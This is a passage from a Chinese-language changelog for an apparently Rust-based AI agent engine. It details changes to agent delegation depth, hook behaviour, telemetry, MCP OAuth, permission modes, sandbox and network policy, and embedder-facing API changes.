- 新设置 `execution.max_agent_depth`(默认 3):委派链最深几层,到这一层的 Agent 拿不到 `Agent`
  工具,团队成员同样受限。以前写死 3。
- 父会话结束时(关闭、删除、被驱逐、daemon 停止),它的常驻团队成员随之停下,正在跑的那一轮
  也被取消。以前成员不受会话结束影响,在途的一轮照跑完,空闲的一直留着。
- 常驻团队成员也记 `agent_spawned`(`background: true`)/ `agent_completed`(成员停下时)遥测。
- 遥测去掉 `shutdown_signal`(剩 21 种):它紧跟 `session_end` 发,`reason` / `duration_ms` /
  `total_turns` 与 `session_end` 重复,`had_errors` / `exit_code` 恒为 `false` / `0`。用
  `session_end` 的 `stop_reason`。
- `tool_execution` 的字段是真数:`input_json_size`、`result_content_size`(结果文本的字节数)
  以前恒为 0;`user_approved` 只在这次调用问过人、人答应了时为 `true`(以前恒为 `true`);
  失败时有 `error_message`(以前从不出现;daemon 写出前照旧换成 `[REDACTED]`)。
- 遥测文件(`telemetry/<session>.jsonl`、`pool.jsonl`、`options.telemetry.output`)只有属主可读写
  (`0600`,已有的文件打开时也收紧),为它们新建的目录是 `0700`;以前随 umask。
- **`PreToolUse` hook 答 `decision: "approve"` 就不再问人**:权限检查要询问的调用直接放行
  (无人值守会话同样),规则拒绝的照样拒绝,别的 hook 说 `block` 照样拦。以前 `approve` 解析了
  但不起作用。`agent` hook 的 `ok: true` 记为 `approve`,所以配在 `PreToolUse` 上的 agent hook
  答 `ok: true` 也有这个效果。
- `agent` hook 的 `model` 生效:子 Agent 跑在这个模型上,按会话的路由选 provider。以前这个字段
  被忽略,子 Agent 用会话的模型。
- hook 回答里的 `suppress_output` 不再是一个字段(写了也不报错):引擎从不把 hook 的 stdout
  交给模型或宿主,没有可隐藏的。
- `async_rewake` 在 daemon 里生效:会话的运行中任务(子 Agent、后台命令、Monitor)有一个结束,
  就算唤醒信号,等着的 hook 在会话处理下一条输入之后、等再下一条之前重跑。以前 daemon 不接
  唤醒通道,这类 hook 永远不会重跑。
- hook 新增 `on_error`(四种后端都认):缺省 `"allow"`,失败照旧放行;写 `"block"` 的,超时、
  出错、command 退出码不是 0 或 2、回答不是 JSON,都等于它回答了 `decision: "block"`,理由写明
  是哪个 hook、怎么失败的(`hooks.md`"失败"一节)。
- **`TaskCompleted` 在任何运行中任务结束时都发**(完成、失败、被停下),与 `TaskCreated` 成对,
  `reason` 是这个任务的 JSON(`task_id`、`kind`、`status`……)。团队成员一轮正常结束时的那次
  `TaskCompleted`(带 `team_name` / `teammate_name`)照旧;只想要后者的 hook 改成看 payload 里
  有没有 `team_name`,或者改用 `TeammateIdle`。
- HTTP hook 新增 `allow_local`(缺省 `false`):写 `true` 的可以指向本机或内网,只放开 url 里的
  主机与端口,重定向到别的内部目标照旧被拒。
- 无人值守的 MCP server(`client_credentials`、`enterprise`)拿到的令牌寿命短于 30 秒左右时,
  调用不再间歇地以"需要授权"失败:令牌何时重新取由 daemon 决定,底层的 OAuth 客户端不再因为
  它"快到期"而拒绝使用刚取到的令牌。

### 嵌入方

- `base::interface::exec::SandboxPolicy` 多了 `deny_ipc_escapes`,`base::tool::SandboxSettings`
  与 `base::context::config::SandboxPolicyConfig` 多了 `unattended_requires_network_policy`;
  用结构体字面量构造它们的要补字段(或改用 `..Default::default()`)。
- `AgentEvent` 多了 `Notification { message, status, turn_id }`;穷举匹配它的要补一支。
- `AgentEvent::TurnComplete` 多了字段 `truncated`,`ModelEvent` 多了变体 `Truncated`(OpenAI
  兼容适配器在补出的 `EndTurn` 之前发),`telemetry::ApiRequestPayload` 多了 `truncated`。
  用结构体字面量构造前两者 / 穷举匹配 `ModelEvent` 的要跟着改。
- `telemetry`:`EventPayload` 去掉上面那 15 个变体及其 payload 类型,多了 `KINDS`;
  `TurnStartPayload` / `TurnCompletePayload` 去掉 `turn_no` / `turn_id`,`UserPromptSubmitPayload`
  只剩 `char_count` / `attachment_count`,`SlashCommandUsedPayload` 是 `{command, kind, has_arg}`,
  `ApiErrorPayload` 的 `http_status` 变 `Option<u16>`、去掉 `retry_count`,
  `PermissionDecisionPayload` 去掉 `rule_source`、`PermissionDecisionOutcome` 去掉
  `Escalated` / `Remembered`,`AgentSpawnedPayload` 是 `{agent_id, role, model?, stage_name?,
  background}`,`AgentCompletedPayload` 去掉 `turn_count` / `tool_call_count`,
  `McpServerConnectedPayload` / `McpConnectionErrorPayload` 精简,`StartupTimingPayload` 见上,
  `SessionEndPayload` 去掉 `total_cost_usd` / `total_errors`。`telemetry::cost`、`telemetry::stats`
  删除。`RedactionPolicy` 与 `TelemetryConfig` 去掉 `redact_prompts` / `redact_tool_content`
  (`RedactionPolicy` 还去掉 `redact_secrets`、`has_content_redaction`),新增
  `RedactionPolicy::scrub_message`。`TelemetryHandleError` 多了 `Io`,`FileRecorder::record`
  写失败返回它;新增 `FileRecorder::with_max_bytes`,去掉 `FileRecorder::exists`。
- `team::prompt::build_coordinator_prompt` 删除(没有地方读它)。
- `McpServerConfig::InProcess` 删除,`McpPolicyGate::admit` 不再豁免它。`McpServerConfig` 新增
  `confined_to_own_env()`,`mcp::config` 新增 `expand_vars_with`;`McpError` 新增 `is_permanent()`。
- `base::interface::mcp_servers::McpServers` 多了必须实现的
  `async fn refresh_if_changed(&mut self) -> bool`;回合循环在工具步骤之后调它,不再调
  `refresh_tools`(`EngineCommand::RefreshMcp` 仍然全量重列)。
- `mcp::notify::NotificationQueue` 删除,换成 `Announcements`(按 server、按种类计数,
  `sink()` / `record()` / `of()`)与 `ListEpochs`;`McpManager::refresh_tools_if_announced` 改名
  `refresh_if_changed`(也重读宣布过变化的 prompt),`pending_notifications` 删除。`share()`
  出来的 manager 与原来那个读同一份通知。`McpManager::refresh_tools` / `refresh_prompts` 对
  列表失败的 server 保留它原有的工具 / prompt。`NotifyingHandler` 多了 `keeping()`。
- `base::interface::exec::local::orphans` 新增 `list(group) -> Listed`(drop 时移出登记)与
  `listed()`。
- `mcp::output_cache::MAX_CACHED_RESULT_BYTES` 新增。
- `AnthropicModel::stream` / `OpenAICompatibleModel::stream` 在返回前等到厂商开始回答:请求被拒
  (状态码、连不上、重试用尽)从 `stream()` 返回 `Err`,不再是流的第一项;两者都认传进来的
  `CancellationToken`,取消时 `stream()` 返回 `ModelError::Cancelled`,流里出 `Err(Cancelled)` 后结束。
  一个什么都没发就结束的 Anthropic 响应是 `ModelError::Network`。
- 流里的 `error` 事件按它的 `type` 分类(`overloaded_error` → `Overloaded`、`rate_limit_error` →
  `RateLimited`、`invalid_request_error` → `Api{400}`……),不再一律 `Api{500}`;Chat Completions
  流里的 `{"error":…}` 块同样成为 `Err`(`ChatCompletionChunk` 多了 `error` 字段)。
  `AnthropicError::StreamInterrupted` 映射为 `ModelError::Network`(原为 `Internal`)。
- `model::stream::ContentBlockStart` 与 `BlockDelta` 多了 `Unknown`:不认识的块类型、增量类型
  跳过这一块,不再让整条流解析失败;穷举匹配它们的要补一支。
- 自己实现 `Model` 的:流必须以 `ModelEvent::EndTurn` 收尾,没有它的流被当作中途断开。
- `ModelEvent` 多了 `MalformedToolUse { id, name, raw_input }`:参数解析不了的工具调用,两个
  内置适配器以它代替 `ToolUse { input: {} }`;穷举匹配 `ModelEvent` 的要补一支,自己实现
  `Model` 的也该这样报。
- `InputMessage::ToolResult` 的 `tool_use_id` 必须是最近一条回复里还没有结果的调用,否则
  `process_turn` 返回 `TurnError::Internal`、transcript 不变。发往模型的请求里,不对应前一条
  回复里任何 `tool_use` 的 `tool_result` 被去掉。
- `runtime::context`(`AgentContext`)删除,从来没有调用方。
- `EngineConfig::file_limits` 的 `max_tool_result_chars` 删除(从没有地方读它;单条工具结果的
  上限是压缩器的 50,000 字符);`default_read_lines`、`max_line_chars` 现在真的决定 `Read` 的
  默认行数与单行上限(以前写死 2000)。新增 `base::tool::MAX_IMAGE_BYTES`。
- `ToolExec::with_timeout` 起的计时任务随这次调用结束,不再睡到超时。
- `AgentSpawner::spawn_agent_with_tools` 的默认实现在收到非空 `extra_tools` 或 `permission_mode`
  时返回错误,不再悄悄丢掉它们去调 `spawn_agent`;支持团队的 spawner 要自己实现它。
  `RuntimeAgentSpawner` 按 `allowed_tools`(非空时)收窄子 Agent 的工具,以前忽略。
- `team::lock` 删除(没有调用方)。`AgentTool::resume_agent`、`Agent::seed_history` 删除(只有
  测试调用)。
- `Agent` 被丢弃时清空它的会话工具注册表(`InMemoryToolRegistry::clear`,新增),并取消
  `SessionContext::session_ended()`(新增)给出的令牌;模块里活得比一轮长的东西(常驻成员)
  挂在它上面。会话的工具彼此引用(`Agent` 工具在它所在的注册表里、团队工具经 spawner 回到
  `Agent` 工具),不清空的话整套都不会被释放。`AgentTool::set_hooks` 只弱持 runner;新增
  `AgentTool::set_session_ended`。
- `ExecutionSettings` 多了 `max_agent_depth`。
- `runtime::streaming::execute_stream` 返回 `Result<StreamResult, StreamFailure>`(原为
  `Result<_, TurnError>`);`StreamResult` 多了 `cancelled`。
- `StopRecovery` 多了 `Continue`,`DefaultRecovery` 对 `pause_turn` 返回它;穷举匹配
  `StopRecovery` 的要补一支。
- `HttpAnthropicClient::with_base` 自己把 base 归成 `…/v1/messages`(新增
  `model::client::messages_url`),调用方不用再补结尾的 `/`(以前不补,`https://relay/anthropic`
  的 `anthropic` 会被换掉);不能带路径的 URL(`data:`)在这里报 `AnthropicError::ParseError`,
  不再等到第一次请求。

- `PermissionMode::Auto`、`PermissionMode::Yolo` 删除(`base::permission` 与
  `base::settings` 两份都删),用 `BypassPermissions`。`permissiveness()` 的取值跟着变了。
- 权限分类器整个删除:`permissions::gate::{AutoClassifier, ClassifyDecision}`、
  `PermissionGate::with_auto_classifier` / `with_yolo_classifier`、`permissions::llm_classifier`、
  `permissions::yolo`、`DecisionReason::Classifier`、`call_purpose::CLASSIFY`;一并删掉只服务它的
  `PermissionGate::{record_denial, record_success, consecutive_denials, total_denials,
  should_fallback_to_prompting}`。
- `SessionState` 多了 `enter_plan_mode()` / `exit_plan_mode()`;`set_permission_mode` 会忘掉
  进入计划模式前记下的模式。
- 自己实现 `Compactor` 的:引擎传给 `compact` 的 `max_tokens` 在自动压缩时是阈值减去
  请求的固定开销与必然补回的提醒;返回的策略不是 `NoOp`、对话却没有变小(连同补回的提醒
  一起算)的,引擎不采用。`DefaultCompactor` 的兜底一条都折不掉时返回 `NoOp`。
- `CompactError::Exhausted` 删除(从没有构造过);`compaction::reactive` 删掉零调用的
  `ReactiveCompactConfig`、`CompactionLevel`、`calculate_thresholds`、`compaction_level`、
  `should_compact_with_state` 与 `CompactionState::last_compact_turn`。新增
  `compaction::llm_summary::is_summary`。
- `ToolResultBudget` 的 `max_per_result` / `max_total` 改按字符计(以前是字节);新增
  `compaction::compact::TOOL_IMAGE_CHARS`。
- `compaction::cached::clear_stale_tool_results` 保留 `tool_use_id`(以前置空,请求会被拒),
  已经清过的不再计数、不再报进 `cache_edits`。
- `SessionManager::replace_messages_after_compact` 自己重排 `message_timestamps`(压缩留下的
  尾部保留原来的时间,前面新插入的记为现在),调用方不要再 `truncate` 它;`resume` 之后的
  `turn_count` 是用户发起的轮数(用户消息与斜杠命令展开),不再是日志行数。
- `Tool` 多了 `leaves_plan_mode()`(缺省 `false`),`Permission` 多了 `check_for_delegate()`
  (按子 Agent 自己的 `SessionState` 判;缺省忽略它、照 `check` 判),都有缺省实现,已有实现
  不用改。自己包一层 `Permission` 的,转发 `check_for_delegate`,子 Agent 的模式和它读过的
  文件才传得到里层。
- `PermissionGate::check` 的模式取 `ctx.permission_mode`,不再读 `ctx.session`;直接调 gate 的
  要把它填成会话当前的模式(`RuleSetPermission` 已经这么做)。
- `permissions::ruleset::RuleHit` 多了 `Unclear`(按 ask 处理),穷举匹配要补一支。
  新增 `permissions::invocation`、`permissions::shell::{segments, Segment, lex, Word, assignments}`。
- `RuleSet::evaluate_shell` 多一个 `group: Option<&str>` 参数(shell 命令的组名,`Monitor` 传
  `Some("Bash")`);新增 `permissions::ruleset::shell_rule_group`。
- 删除 `permissions::ruleset::{SAFE_TOOLS, CheckResult, RuleSet::check}` 与
  `PermissionGate::explain_decision`:都没有生产调用点(裁决走 `PermissionGate::check`)。
- `AgentTypeSource::may_loosen` 同时管 `max_turns` 与 `permission_mode`。新增
  `PermissionMode::for_delegate`(两个 `PermissionMode` 上都有)。
- `base::permission::PermissionMode` 多了 `min_permissive`,并能 `into()` 成
  `base::settings::PermissionMode`。
- `base` 的 cargo feature `team-mode`、`plugin-marketplace`、`experimental-agent` 删除
  (什么也不控制)。`base::features` 整个删除,`Settings::feature_flags` 随之去掉;
  `CompactionConfig` 多了 `reactive` 与 `cached_microcompact`。
- `SessionState` 去掉 `plan_text` / `set_plan_text` / `clear_plan_text` 与 `plan_slug` 那三个;
  `compaction::compact::PostCompactContext` 去掉 `plan_content`。
- `runtime::agent::Agent` 去掉 `set_plan_mode`、`register_running_task`、`clear_running_tasks`:
  压缩后的提醒现在直接读会话状态——处于 plan 模式、还在跑的后台任务,在丢掉或总结了历史的
  压缩(不含只清工具结果的 MicroCompact)之后各补一条。
- `tools::plan_verify` 模块与 `tools::plan_mode::{plan_text, plan_state_for_test}` 删除。
- `base::frozen::find_relevant_memories`、`base::memory::select_memories_with_llm`、
  `MemoryStore::scan_memory_headers` 删除;按相关性挑记忆用 `base::memory::select_memories_from`
  (生产路径 `MemoryRetriever` 一直走它)。
- `SkillCatalog` 多了 `expand`(有缺省实现:正文加参数替换,不执行、不授权),返回新类型
  `base::interface::skill_catalog::SkillExpansion { text, grants }`;包一层 `SkillCatalog` 的
  要把它转发下去,否则 `/name` 拿到的是缺省展开。新增 `skills::expand_for_invocation` /
  `skills::ExpandError` 与 `CommandRegistry::run_prompt_command`(斜杠命令在轮里走的就是它)。
  `SkillManager::get_skill_content` 对磁盘 skill 返回去掉 frontmatter 的正文。
- 新增 `MemoryStore::for_paths`(会话用的记忆目录唯一的推导处)、`user_dir`、`record_recalled`,
  `base::memory::{memory_prompt, MAX_MEMORIES}`;`scan_for_secrets` / `SecretPattern` 挪到
  `base::memory`(`team::team_memory` 里照旧可用)。`assemble_prompt` 的 `memory_store` 参数
  现在真的被用来出 `# Memory` 一节,传进去的应是会话的那个 store。`FrozenContext::memory_dir`
  是全局记忆目录,`memory_index` 是两处合并的索引。
- `hooks::HookRunner::set_network`、`auth::OAuth2Client::with_network` 删除;后者要换出口直接设
  `net` 字段。
- `auth` crate 整个删除(`OAuth2Client`、`TokenStore`、`CallbackListener`、`PkceVerifier`、
  `ProviderConfig`……),它只有 MCP 在用;OAuth 现在是 `mcp::oauth`,协议部分用 rmcp。
- `mcp::oauth::{McpOAuth, McpOAuthStore, McpOAuthResolver}` 删除,`McpAuth` 取代 `McpOAuth`;
  `mcp::auth_tool::McpAuthTool`(从未注册)删除。
- `Assembly::mcp_oauth_resolver` 删除,换成 `mcp_credential_store: Option<Arc<dyn
  mcp::oauth::McpCredentialStore>>`(令牌存哪,默认 0600 文件)与 `mcp_oauth_client:
  Option<mcp::oauth::McpOAuthClient>`(动态注册时的客户端名、CIMD 地址)。
  `SessionPool::with_mcp_oauth_resolver` / `mcp_oauth()` 换成 `with_mcp_auth(store, client)` /
  `mcp_auth()`。
- `McpServerConfig::{StreamableHttp, Sse}` 的 `oauth_provider: Option<String>` 换成
  `oauth: Option<McpOAuthConfig>`;`oauth_provider()` 删除,有 `oauth()` 与 `oauth_capable()`。
- `McpManager::connect_all_with_oauth` 换成 `connect_all_with(servers, env, auth: Option<Arc<McpAuth>>)`;
  新增 `share()`(会话用的、共享连接的那一份)、`pending()`(等登录的 server)。
  `McpError` 多了 `AuthRequired` / `InsufficientScope`。
- `McpManager::from_clients` 改成 `async`,读好工具与 prompt 再返回。新增
  `connect_all_within(.., wait)`(到点先返回,其余经 `LateConnects` / `absorb()` 陆续进来)、
  `connecting()`、`failed()`;`ServerStatus` 多了 `connected`。
- `McpServerConfig` 每个变体多了 `timeouts: McpTimeouts`(`#[serde(flatten)]`;结构体字面量要补
  `timeouts: Default::default()`)。`McpError` 多了 `ConnectionLost`、`Timeout`;
  `McpClient` 多了带默认实现的 `is_connected()`。
- 新模块 `mcp::naming`(`tool_name`、`tool_names`、`server_segment`);
  `mcp::prompts::{split_command_name, MCP_COMMAND_PREFIX}` 删除,`McpToolAdapter` 多了 `named()`。
- rmcp 升到 3.9,开了 `auth`、`auth-client-credentials-jwt`、`auth-enterprise-managed`。
- `Assembly` 多了 `mcp_enterprise_idp: Option<mcp::config::EnterpriseIdp>`;`McpPolicy` 多了
  `allowed_authorization_servers`、`enterprise_idp` 两个字段(结构体字面量要补,或用
  `..Default::default()`)。`McpOAuthConfig` 多了 `grant`、`private_key_jwt`。
- `history::store::HistoryStore` 多了 `sync` 与 `claim`(都有缺省实现),新类型
  `history::store::SessionClaim`;`HistoryError` 多了 `Locked`(穷举匹配的要补一支)。
  `JsonlHistoryStore` 的 `append` 不再承诺立即持久,`sync` 才是;`delete` 在会话被别的进程
  占着时报 `Locked`。`SessionManager::persist` 写了东西就 `sync` 一次。包装别的 store 的
  实现要把这两个方法转发下去,否则拿到的是什么都不做的缺省。
- `history::blob::PasteStore::cleanup` 删除(按 mtime 删,不管还有没有日志引用)。
  `JsonlHistoryStore` 的写锁按会话分开,一个会话的 IO 卡住不再挡别的会话;
  `set_session_title` 与 append 拿同一把锁,另一个进程占着这个会话时同样报 `Locked`。
- `transcript::ExtensionsAreVisible` 对它不覆盖的扩展条目照引擎的规矩处理(`agix.context` 的
  drop / edit 照样生效);`LogEntry::ToolResult` 只并进全是工具结果的末尾 User,同一个
  `tool_use_id` 只并一次。
- `team::mailbox::MailboxStore::send` 返回 `Result<(), UnknownPeer>`,不是成员的收件人被拒;
  新增 `MailboxStore::check_peer` 与 `team::mailbox::mailbox_file`(标签到文件名)。
- `plugin::cache::check_component` 新增;`plugin::install::{install, uninstall}` 与
  `PluginCache::remove_version` 对不合规的 `name` / `version` 返回 `PluginError::Schema`,
  `remove_version` 还拒绝解析到 cache 之外的插件目录。
- `daemon::write_lock_file` 返回 `DaemonLockGuard`(`Deref` 到 `DaemonLock`),持有期间占着
  `flock`,drop 时删掉锁文件;不要再自己删。新增 `discovery::create_private_dir`。
- `SessionPool::shutdown_all` 一开始就拒绝再建会话,重复调用等第一次做完。新增
  `DaemonServer::shutdown()`:先停监听再 `shutdown_all`,自己先 `shutdown_all` 再取消
  `shutdown_token` 的嵌入方改用它。
- `DaemonServer::bind_unix` 把 socket 设为 `0600`(自己 chmod 的可以去掉)。
- `rpc::SessionOptions::from_params` 与 `rpc::IgnoredOption` 新增,`SessionOptions::FIELDS`
  列出全部字段名。`base::settings::unknown_settings_keys` 新增。
- `plugin::blocklist` 模块与 `PluginError::Blocked` 删除。`plugin::manifest::Plugin::path`
  返回 `Result<PathBuf, PluginError>`(解析符号链接后不在包里就报错)。`PluginCache::is_cached`
  要求有 `plugin::cache::INSTALLED_MARKER`;新增 `PluginCache::{lock, plugin_dir}`、
  `plugin::install::{MAX_ARCHIVE_BYTES, UnpackLimits}`、`EnableState::{path, fault}`。
- `assembly::plugins::PluginSubsystem::disclosure` 删除(只给 `plugin.install` 用,结果在它的
  响应里),新增 `health_check()`。
- `ScriptCarrier` 多了 `limits()`;`call_blocking` 在多线程运行时的工作线程上经
  `tokio::task::block_in_place` 跑脚本。新增 `script_host::bindings::{MAX_LIMITS,
  PACKAGE_MAX_LIMITS}`。
- 新增 `ptc::default_run_slots()` 与 `RunCodeTool::with_run_slots`。
- `hooks::HookConfig::{Prompt, Http, Agent}` 多了 `if_pattern: Option<String>`(结构体字面量
  要补)。`hooks::runner::DEFAULT_HOOK_TIMEOUT_MS` 是 `60_000`。
- `base::interface::exec::HttpRequest` 多了 `public_only: bool`(结构体字面量要补;`new()`
  缺省 `false`,`public_only()` 置位),新增 `base::interface::exec::is_internal_address`。
  `LocalNetwork` 对 `Origin::Agent` 的请求与 `public_only` 的请求在每一跳上拒绝内部地址;
  自己实现 `Network` 的要照做。`hooks::runner::ssrf` 模块删除。
- `hooks::HookRunner::enable_file_watching` 多了 `ambient: hooks::payload::Ambient`(payload 的
  会话 id、cwd、模式,触发时现取),第二次调用往同一个 watcher 里加文件而不是替换它;新增
  `watch_files`。`run_elicitation` / `run_elicitation_result` 第一个参数是 `&Ambient`,
  `check_rewakes` 收一个 `HookInput` 作底。`hooks::watcher::FileWatcher` 的 `new` /
  `watch_paths` 换成 `start` / `add`。`HookInput` 多了 `stop_hook_active`、`team_name`、
  `teammate_name`(结构体字面量要补或用 `..Default::default()`),新增 `with_team`、
  `from_ambient`。
- `runtime::module::SessionContext` 多了 `hook_ambient`。`runtime::agent::Builder` 多了
  `team_seat(TeamSeat)`;只在 `agent_depth` 为 0 的会话上启动 `FileChanged` 监视。
- `AgentSpawner::spawn_agent_with_tools` 多了最后一个参数 `seat: Option<TeamSeat>`(新类型
  `base::interface::agent_spawner::TeamSeat { team, member }`);自己实现这个方法的要加上。
- `agents::agent_tool::AgentTool` 起的子 Agent 用 `set_hooks` 给的那个 runner(经
  `Builder::hooks`),不再从 settings 另建。
- 删除没有调用方的 `base::rpc`、`base::log`(`base::interface::log`:`Logger`、`NoopLogger`、
  `LogRouter` 与 `log_*!` 宏)、`tools::aliases`(`BriefTool`、`PowerShellTool`、`ReplTool`)
  与 `assembly::session_manager`(`daemon::session_manager`)。日志用 `tracing`。
- `telemetry`:删除 `ShutdownSignalPayload` 与 `TelemetryEvent::shutdown_signal`。`FileRecorder`
  建的文件是 `0600`,为它新建的那一层目录是 `0700`。
- `hooks::HookResponse` 去掉 `suppress_output`。`check_rewakes` 在没有 hook 等着时把通道里的信号
  清掉:hook 要求唤醒之前就结束的工作不算数。
- `AgentSpawner` 多了 `spawn_agent_on_model(prompt, cwd, cancel, model)`(agent hook 的 `model`
  走它),缺省实现拒绝;只有 `RuntimeAgentSpawner` 真正实现。
- `runtime::agent::Builder` 没给 `wake_receiver`、hooks runner 又是自己建的(根会话)时,
  会话的运行中任务结束就唤醒 `async_rewake` hook;给了 `wake_receiver` 的照旧只听它。
- `hooks::HookConfig` 的四个变体都多了 `on_error: hooks::OnError`(结构体字面量要补,
  `OnError::Allow` 是原来的行为)。`HookOutcome::Ran` 多了 `failure: Option<String>`:跑了但
  回答不能用(退出码不是 0 或 2、不是 JSON)时写明原因。
- `base::interface::memory::MemoryStore::{compact, with_environment}`、
  `DurableMemory::{staleness_penalty, effective_confidence}`、`team::TeamMemoryStore::compact`
  删除:记忆不再按年龄与置信度自动清理。新增 `assembly::doctor::MemoryCheck`。
- `hooks::HookConfig::Http` 多了 `allow_local: bool`。`base::interface::exec::HttpRequest` 多了
  `internal_target: bool`(结构体字面量要补;`public_only_but_target()` 连同 `public_only` 一起
  置位):`Origin::Operator` 的请求去 url 自己的主机与端口时不查内部地址。自己实现 `Network`
  的要照做。
